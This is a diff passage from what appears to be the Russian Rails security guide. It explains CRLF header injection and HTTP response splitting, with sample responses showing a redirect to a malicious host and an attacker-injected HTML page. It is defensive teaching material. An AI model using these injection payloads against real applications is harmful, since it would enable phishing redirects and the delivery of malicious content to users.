+<p>Отметьте, что &#8220;%0d%0a&#8221; это <span class="caps">URL</span>-код для &#8220;\r\n&#8221;, являющиеся возвратом каретки и новой строкой (<span class="caps">CRLF</span>) в Ruby. Таким образом, итоговым заголовком  <span class="caps">HTTP</span> для второго примера будет следующее, поскольку второе поле заголовка Location перезаписывает первое.</p>
+<div class="code_container"><pre class="brush: plain; gutter: false; toolbar: false">
+HTTP/1.1 302 Moved Temporarily
+(...)
+Location: http://www.malicious.tld
+</pre></div>
+<p>Таким образом, <em class="highlight">направления атаки для инъекции заголовка основаны на инъекции символов <span class="caps">CRLF</span> в поле заголовка.</em> И что сможет сделать злоумышленник с ложным перенаправлением? Он сможет перенаправить на фишинговый сайт, который выглядит так же, как Ваш, но просит заново авторизоваться (и посылает регистрационные данные злоумышленнику). Или он сможет установить злонамеренное ПО, используя дыры в безопасности браузера на этом сайте. Rails 2.1.2 экранирует эти символы для поля Location в методе <tt>redirect_to</tt>. <em class="highlight">Убедитесь, что Вы делаете то же самое, когда создаете другие поля заголовка на основе пользовательского ввода.</em></p>
+
+<h5 id="response-splitting">9.1. Response Splitting</h5>
+<p>Если инъекция заголовка была возможна, то Response Splitting так же может быть возможен. В <span class="caps">HTTP</span> блок заголовка заканчивается двумя CRLF, затем идут фактические данные (обычно <span class="caps">HTML</span>). Идея Response Splitting состоит во внедрении двух CRLF в поле заголовка, после которых следует другой отклик со злонамеренным <span class="caps">HTML</span>. Отклик будет таким:</p>
+<div class="code_container"><pre class="brush: plain; gutter: false; toolbar: false">
+HTTP/1.1 302 Found [First standard 302 response]
+Date: Tue, 12 Apr 2005 22:09:07 GMT
+Location: Content-Type: text/html
+
+
+HTTP/1.1 200 OK [Second New response created by attacker begins]
+Content-Type: text/html
+
+
+&amp;lt;html&amp;gt;&amp;lt;font color=red&amp;gt;hey&amp;lt;/font&amp;gt;&amp;lt;/html&amp;gt; [Arbitary malicious input is
+Keep-Alive: timeout=15, max=100         shown as the redirected page]
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html
+</pre></div>
+<p>При определенных обстоятельствах это сможет предоставить зловредный <span class="caps">HTML</span> жертве. Однако, это будет работать только с соединениями Keep-Alive  (а многие браузеры используют одноразовые соединения). Но нельзя на это полагаться. <em class="highlight">В любом случае, это серьезный баг, и следует обновить Rails до версии 2.0.5 или 2.1.2, чтобы устранить риски инъекции заголовка (и поэтому response splitting).</em></p>
